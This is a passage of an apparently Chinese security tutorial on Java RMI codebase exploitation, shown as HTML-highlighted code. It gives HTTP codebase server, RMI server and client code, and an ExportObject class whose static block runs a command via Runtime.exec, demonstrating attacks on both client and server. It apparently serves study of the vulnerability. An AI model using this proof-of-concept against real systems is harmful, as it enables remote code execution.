class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HTTPServer</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange httpExchange)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;new http request from &quot;</span> + httpExchange.getRemoteAddress() + <span class="string">&quot; &quot;</span> + httpExchange.getRequestURI());</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> HTTPServer.class.getResourceAsStream(httpExchange.getRequestURI().getPath());</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="keyword">while</span> (inputStream.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                byteArrayOutputStream.write(inputStream.read());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">            httpExchange.sendResponseHeaders(<span class="number">200</span>, bytes.length);</span><br><span class="line">            httpExchange.getResponseBody().write(bytes);</span><br><span class="line">            httpExchange.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        com.sun.net.httpserver.<span class="type">HttpServer</span> <span class="variable">httpServer</span> <span class="operator">=</span> com.sun.net.httpserver.HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8000</span>), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;String HTTP Server on port: 8000&quot;</span>);</span><br><span class="line">        httpServer.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">HTTPServer</span>());</span><br><span class="line">        httpServer.setExecutor(<span class="literal">null</span>);</span><br><span class="line">        httpServer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExportObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">4474289574195395731L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">//这里由于在static代码块中，无法直接抛异常外带数据，不过有其他方式外带数据，可以自己查找下。没写在构造函数中是因为项目中有些利用方式不会调用构造参数，所以为了方标直接写在static代码块中</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String lineStr;</span><br><span class="line">        <span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="literal">null</span>)</span><br><span class="line">            sb += lineStr + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        inBr.close();</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(sb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulnFunc</span><span class="params">()</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ExportObject <span class="title function_">vulnFunc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ExportObject</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExportObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">4474289574195395731L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置codebase</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectImpl</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulnFunc</span><span class="params">()</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// JDK 6u45、7u21之后，需要设置useCodebaseOnly</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        <span class="comment">// 配置policy文件以允许从远程加载类库</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>,<span class="string">&quot;D://java.policy&quot;</span>);</span><br><span class="line">        <span class="comment">// 开启RMISecurityManager</span></span><br><span class="line">        <span class="type">RMISecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMISecurityManager</span>();</span><br><span class="line">        System.setSecurityManager(securityManager);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line">        stub.vulnFunc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>先运行HTTPServer启动代码，起一个codebase，然后运行Server端启动代码，再运行Client端启动代码<br>成功执行HTTPServer的恶意返回结果子类的静态代码块。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695169373115-8cd40489-01fd-40f3-86a3-950eb76d73aa.png" alt="image.png"></p><h3 id="攻击Server端"><a href="#攻击Server端" class="headerlink" title="攻击Server端"></a>攻击Server端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HTTPServer</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange httpExchange)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;new http request from &quot;</span> + httpExchange.getRemoteAddress() + <span class="string">&quot; &quot;</span> + httpExchange.getRequestURI());</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> HTTPServer.class.getResourceAsStream(httpExchange.getRequestURI().getPath());</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="keyword">while</span> (inputStream.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                byteArrayOutputStream.write(inputStream.read());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">            httpExchange.sendResponseHeaders(<span class="number">200</span>, bytes.length);</span><br><span class="line">            httpExchange.getResponseBody().write(bytes);</span><br><span class="line">            httpExchange.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        com.sun.net.httpserver.<span class="type">HttpServer</span> <span class="variable">httpServer</span> <span class="operator">=</span> com.sun.net.httpserver.HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8000</span>), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;String HTTP Server on port: 8000&quot;</span>);</span><br><span class="line">        httpServer.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">HTTPServer</span>());</span><br><span class="line">        httpServer.setExecutor(<span class="literal">null</span>);</span><br><span class="line">        httpServer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExportObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">4474289574195395731L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">//这里由于在static代码块中，无法直接抛异常外带数据，不过有其他方式外带数据，可以自己查找下。没写在构造函数中是因为项目中有些利用方式不会调用构造参数，所以为了方标直接写在static代码块中</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String lineStr;</span><br><span class="line">        <span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="literal">null</span>)</span><br><span class="line">            sb += lineStr + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        inBr.close();</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(sb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulnFunc</span><span class="params">(HelloObject helloObject)</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulnFunc</span><span class="params">(HelloObject helloObject)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloObject</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line">        <span class="comment">// JDK 6u45、7u21之后，需要设置useCodebaseOnly</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        <span class="comment">// 配置policy文件以允许从远程加载类库</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>,<span class="string">&quot;D://java.policy&quot;</span>);</span><br><span class="line">        <span class="comment">// 开启RMISecurityManager</span></span><br><span class="line">        <span class="type">RMISecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMISecurityManager</span>();</span><br><span class="line">        System.setSecurityManager(securityManager);</span><br><span class="line">        <span class="comment">// 设置codebase</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectImpl</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulnFunc</span><span class="params">(HelloObject helloObject)</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloObject</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExportObject</span> <span class="keyword">extends</span> <span class="title class_">HelloObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">4474289574195395731L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span 